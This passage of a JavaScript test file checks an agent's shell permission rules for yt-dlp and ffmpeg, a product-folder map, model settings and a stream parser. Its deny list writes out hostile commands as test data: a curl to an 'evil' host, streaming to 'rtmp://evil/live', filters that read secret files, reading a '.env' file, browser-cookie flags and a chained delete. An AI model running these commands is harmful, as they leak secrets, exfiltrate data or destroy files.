    'yt-dlp -o "Producto Bebidas/videos/venezuela/referencias/%(id)s.%(ext)s" https://www.tiktok.com/@a/video/1',
    'yt-dlp -o "C:/ventas/Producto Bebidas/videos/venezuela/broll_tiktok/%(id)s.%(ext)s" -f mp4 https://vm.tiktok.com/abc',
    'yt-dlp -P "C:/ventas/Producto Bebidas/videos/venezuela/referencias" https://www.tiktok.com/@a/video/1',
    'yt-dlp --paths "Producto Bebidas/videos" --output "%(id)s.%(ext)s" https://www.tiktok.com/@a/video/1',
    'yt-dlp -F https://www.tiktok.com/@a/video/1',
    'yt-dlp --dump-json https://www.tiktok.com/@a/video/1',
    'ffprobe -v error -show_format "Producto Bebidas/videos/venezuela/referencias/a.mp4"',
    'ffmpeg -ss 00:00:03 -to 00:00:07 -i "Producto Bebidas/videos/venezuela/referencias/a.mp4" -c copy "Producto Bebidas/videos/venezuela/broll/a-corte.mp4"',
    'ffmpeg -i "C:/ventas/Producto Bebidas/videos/a.mp4" -vf "crop=iw:ih*0.9:0:0,scale=1080:1920" -an "C:/ventas/Producto Bebidas/videos/venezuela/broll/a-9x16.mp4"',
    'ffmpeg -f lavfi -i color=c=black:s=1080x1920:d=2 "Producto Bebidas/videos/negro.mp4"',
  ];
  for (const c of ok) assert.equal(bashDecision(c, ctx).decision, 'allow', c);
  const bad = [
    // yt-dlp
    ['yt-dlp https://www.tiktok.com/@a/video/1', /con -o/],
    ['yt-dlp -o "x/%(id)s.%(ext)s"', /dirección/],
    ['yt-dlp -o "C:/Windows/Temp/%(id)s.%(ext)s" https://x.com/v', /escribir dentro de la carpeta/],
    ['yt-dlp -o "../out.mp4" https://x.com/v', /\.\./],
    ['yt-dlp -P "C:/Users/x/Desktop" https://x.com/v', /escribir dentro/],
    ['yt-dlp --exec "calc" -o x https://x.com/v', /bloqueada/],
    ['yt-dlp --cookies-from-browser edge -o x https://x.com/v', /bloqueada/],
    ['yt-dlp --cookies c.txt -o x https://x.com/v', /bloqueada/],
    ['yt-dlp --downloader curl -o x https://x.com/v', /bloqueada/],
    ['yt-dlp --external-downloader aria2c -o x https://x.com/v', /bloqueada/],
    ['yt-dlp --ffmpeg-location C:/x -o x https://x.com/v', /bloqueada/],
    ['yt-dlp -U', /bloqueada/],
    ['yt-dlp --update-to nightly', /bloqueada/],
    ['yt-dlp -a urls.txt -o x', /bloqueada/],
    ['yt-dlp -o x https://x.com/v && curl http://evil', /red/],
    // ffmpeg
    ['ffmpeg -y -i a.mp4 b.mp4', /sobrescribir/],
    ['ffmpeg -i https://evil.example/a.mp4 b.mp4', /locales/],
    ['ffmpeg -i a.mp4 rtmp://evil/live', /locales/],
    ['ffmpeg -i a.mp4 C:/Windows/Temp/out.mp4', /escribir dentro/],
    ['ffmpeg -i a.mp4 ../out.mp4', /\.\./],
    ['ffmpeg -i a.mp4 -vf "movie=C:/Users/x/secret.png[w];[in][w]overlay" out.mp4', /filtro/],
    ['ffmpeg -i a.mp4 -vf "subtitles=C:/x/a.srt" out.mp4', /filtro/],
    ['ffmpeg -i a.mp4 -vf "drawtext=textfile=C:/x/a.txt" out.mp4', /filtro/],
    ['ffmpeg -i a.mp4 -filter_script:v f.txt out.mp4', /bloqueada/],
    ['ffmpeg -i "Producto Bebidas/.env" out.mp4', /bloqueados/],
    ['ffmpeg -i a.mp4 out.mp4 && del out.mp4', /Borrar/],
    ['ffprobe -i https://evil.example/a.mp4', /locales/],
  ];
  for (const [cmd, why] of bad) {
    const r = bashDecision(cmd, ctx);
    assert.equal(r.decision, 'deny', cmd);
    assert.match(r.reason, why, cmd);
  }
});

// ---- product map ------------------------------------------------------------------------------------------------------

function mapWorkspace() {
  const tmp = mkTmp('map');
  const root = path.join(tmp, 'ventas');
  const put = (rel, n = 1, ext = 'pdf') => {
    const dir = path.join(root, rel);
    fs.mkdirSync(dir, { recursive: true });
    for (let i = 0; i < n; i += 1) fs.writeFileSync(path.join(dir, `f${i}.${ext}`), 'x');
  };
  put('Producto Bebidas/pdf/colombia', 3);
  put('Producto Bebidas/pdf/venezuela', 2);
  put('Producto Bebidas/audios/colombia', 4, 'mp3');
  put('Producto Bebidas/audios/venezuela', 1, 'mp3');
  put('Producto Bebidas/videos/venezuela/_build', 50, 'mp4');
  put('Producto Bebidas/videos/venezuela', 2, 'mp4');
  put('Producto Bebidas/venezuela/pruebas-codex', 1, 'png');
  fs.writeFileSync(path.join(root, 'Producto Bebidas', 'contexto.md'), 'x');
  put('producto ideas/Producto barf/referencias', 5);
  put('samar/campanas', 2, 'mp4');
  put('agentAutoX1/app', 3, 'js');
  put('whatsapp-pods/x', 3, 'js');
  return { tmp, root };
}

test('product map: active products, countries, counts, ideas and other folders; apps and bots never appear', () => {
  const m = mapWorkspace();
  try {
    const text = buildProductMapText(m.root, { now: new Date('2026-11-01T00:00:00Z') });
    assert.match(text, /^MAPA DE PRODUCTOS \(generado 2026-11-01/);
    assert.match(text, /Producto Bebidas — ACTIVO\. Países: colombia, venezuela\. En la raíz: contexto\.md/);
    assert.match(text, /audios\/: colombia 4 \(audio 4\) · venezuela 1 \(audio 1\)/);
    assert.match(text, /pdf\/: colombia 3 \(pdf 3\) · venezuela 2 \(pdf 2\)/);
    assert.match(text, /venezuela\/ \(carpeta de país\): pruebas-codex 1/);
    assert.match(text, /videos\/: venezuela 2 \(video 2\)/, 'build caches are not counted');
    assert.match(text, /producto ideas\/ \(ideas y producto archivado[^)]*\): Producto barf 5/);
    assert.match(text, /Otras carpetas de contenido: samar/);
    assert.ok(!/agentAutoX1|whatsapp-pods/i.test(text));
    assert.ok(text.length < 7200);
  } finally {
    rmTmp(m.tmp);
  }
});

test('product map: cached by folder mtimes, rebuilt when something is added, and always under the size cap', () => {
  const m = mapWorkspace();
  try {
    const cacheFile = path.join(m.tmp, 'cache', 'product-map.json');
    const first = getProductMap({ root: m.root, cacheFile, now: new Date('2026-11-01T00:00:00Z') });
    const built = JSON.parse(fs.readFileSync(cacheFile, 'utf8')).builtAt;
    // Same tree, later clock: served from the cache (the date inside the text does not change).
    assert.equal(getProductMap({ root: m.root, cacheFile, now: new Date('2026-11-09T00:00:00Z') }), first);
    assert.equal(JSON.parse(fs.readFileSync(cacheFile, 'utf8')).builtAt, built);
    // A new file in a folder bumps its mtime: the map is rebuilt.
    const dir = path.join(m.root, 'Producto Bebidas', 'audios', 'venezuela');
    fs.writeFileSync(path.join(dir, 'nuevo.mp3'), 'x');
    const later = new Date(Date.now() + 5_000);
    fs.utimesSync(dir, later, later);
    const second = getProductMap({ root: m.root, cacheFile, now: new Date('2026-11-09T00:00:00Z') });
    assert.notEqual(second, first);
    assert.match(second, /venezuela 2 \(audio 2\)/);
    // A huge tree is cut at the cap.
    for (let i = 0; i < 400; i += 1) fs.mkdirSync(path.join(m.root, 'Producto Bebidas', `carpeta-larga-${i}`, 'sub-con-nombre-largo'), { recursive: true });
    assert.ok(buildProductMapText(m.root).length <= 7200);
    assert.equal(getProductMap({ root: path.join(m.tmp, 'no-existe') }), '');
  } finally {
    rmTmp(m.tmp);
  }
});

// ---- launch arguments and settings -----------------------------------------------------------------------------------------

test('creativo settings: Sonnet by default (also when the saved model is empty), configurable, and the Codex options are validated', () => {
  const fx = makeDataDir();
  try {
    const agent = AGENTS.creativo;
    const loaded = loadSettings(fx.dataDir, agent);
    assert.equal(loaded.model, 'sonnet');
    assert.equal(loaded.codexModel, 'gpt-6.1-terra');
    assert.equal(loaded.codexEffort, 'low');
    assert.equal(saveSettings(fx.dataDir, { model: 'opus', codexEffort: 'medium', codexHome: 'C:/h' }, agent).model, 'opus');
    assert.equal(loadSettings(fx.dataDir, agent).codexHome, 'C:/h');
    assert.throws(() => saveSettings(fx.dataDir, { codexEffort: 'xhigh' }, agent), /esfuerzo/);
    assert.throws(() => saveSettings(fx.dataDir, { codexModel: 'bad model' }, agent), /modelo de Codex/);
    assert.throws(() => saveSettings(fx.dataDir, { codexPath: 'a"b' }, agent), /ruta/);
    // The Analista keeps the common keys only.
    assert.deepEqual(Object.keys(loadSettings(fx.dataDir, AGENTS.analista)).sort(), ['claudePath', 'learning', 'model', 'web']);
    assert.equal(loadSettings(fx.dataDir, AGENTS.analista).model, '');
  } finally {
    fx.cleanup();
  }
});

test('a creativo turn passes --model sonnet by default, the creativo MCP server and no Higgsfield; a saved model wins', async () => {
  const fx = makeDataDir();
  const tmp = mkTmp('args');
  const saved = { root: process.env.AGENTAUTO_CREATIVO_ROOT, up: process.env.USERPROFILE, home: process.env.HOME, scenario: process.env.FAKE_CLAUDE_SCENARIO, dump: process.env.FAKE_CLAUDE_DUMP, key: process.env.AGENTAUTO_ELEVEN_KEY };
  try {
    const root = path.join(tmp, 'ws');
    const home = path.join(tmp, 'home');
    fs.mkdirSync(path.join(root, 'Producto Bebidas', 'venezuela'), { recursive: true });
    fs.mkdirSync(home, { recursive: true });
    const dump = path.join(tmp, 'dump.json');
    Object.assign(process.env, { AGENTAUTO_CREATIVO_ROOT: root, USERPROFILE: home, HOME: home, FAKE_CLAUDE_SCENARIO: 'ok', FAKE_CLAUDE_DUMP: dump, AGENTAUTO_ELEVEN_KEY: 'xi-do-not-write' });
    const turn = async (settings) => {
      const events = [];
      const res = await runTurn({ dataDir: fx.dataDir, agentId: 'creativo', text: 'hola', emit: (e) => events.push(e), claude: { command: process.execPath, prefixArgs: [FAKE] }, now: () => fx.now, locate: () => null, settings: { ...loadSettings(fx.dataDir, AGENTS.creativo), ...settings } });
      assert.equal(res.ok, true, res.error);
      return JSON.parse(fs.readFileSync(dump, 'utf8'));
    };
    const d = await turn({ model: '' });
    const at = (flag) => d.argv[d.argv.indexOf(flag) + 1];
    assert.equal(at('--model'), 'sonnet');
    assert.ok(!JSON.stringify(d.argv).toLowerCase().includes('higgsfield'));
    assert.match(at('--append-system-prompt'), /MAPA DE PRODUCTOS/);
    assert.match(at('--append-system-prompt'), /Producto Bebidas — ACTIVO/);
    assert.match(at('--append-system-prompt'), /no explores carpetas sin necesidad/);
    assert.ok(!at('--append-system-prompt').toLowerCase().includes('higgsfield'));
    assert.match(at('--allowedTools'), /mcp__creativo__propose_generation/);
    // The MCP config of the turn names the creativo server and carries only a reference to the key, never its value.
    assert.deepEqual(Object.keys(d.mcpConfig.mcpServers), ['creativo']);
    assert.equal(d.mcpConfig.mcpServers.creativo.env.AGENTAUTO_ELEVEN_KEY, '${AGENTAUTO_ELEVEN_KEY}');
    assert.equal(d.mcpConfig.mcpServers.creativo.env.AGENTAUTO_CREATIVO_ROOT, root);
    assert.ok(!JSON.stringify(d.mcpConfig).includes('xi-do-not-write'));
    assert.ok(d.envKeys.includes('AGENTAUTO_ELEVEN_KEY'), 'Claude Code needs the variable to expand the reference');
    const second = await turn({ model: 'opus' });
    assert.equal(second.argv[second.argv.indexOf('--model') + 1], 'opus');
  } finally {
    for (const [k, v] of Object.entries({ AGENTAUTO_CREATIVO_ROOT: saved.root, USERPROFILE: saved.up, HOME: saved.home, FAKE_CLAUDE_SCENARIO: saved.scenario, FAKE_CLAUDE_DUMP: saved.dump, AGENTAUTO_ELEVEN_KEY: saved.key })) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    fx.cleanup();
    rmTmp(tmp);
  }
});

test('the parser reports the base context (first model call) and announces a proposal', () => {
  const parser = createStreamParser();
  const line = (o) => JSON.stringify(o);
  parser.feed(line({ type: 'assistant', message: { usage: { input_tokens: 5, cache_read_input_tokens: 9_000, cache_creation_input_tokens: 1_000, output_tokens: 1 }, content: [{ type: 'tool_use', id: 't1', name: 'mcp__creativo__propose_generation', input: {} }] } }));
  parser.feed(line({ type: 'assistant', message: { usage: { input_tokens: 9, cache_read_input_tokens: 99_000, cache_creation_input_tokens: 0, output_tokens: 1 }, content: [{ type: 'text', text: 'x' }] } }));
  const events = parser.feed(line({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 't1', content: JSON.stringify({ proposal_id: 7, estado: 'esperando_aprobacion' }) }] } }));
  assert.deepEqual(events.map((e) => e.type), ['step_done', 'proposal']);
  assert.equal(events[0].summary, 'esperando tu aprobación');
  assert.equal(events[1].id, 7);
  const [result] = parser.feed(line({ type: 'result', subtype: 'success', is_error: false, result: 'ok', session_id: 's', duration_ms: 5, num_turns: 2, usage: { input_tokens: 14, output_tokens: 2, cache_read_input_tokens: 108_000 } }));
  assert.equal(result.baseContext, 10_005);
  // No assistant message with usage: no field at all (the Analista's events stay byte-identical).
  const bare = createStreamParser().feed(line({ type: 'result', subtype: 'success', is_error: false, result: 'ok', usage: {} }))[0];
  assert.equal('baseContext' in bare, false);
});
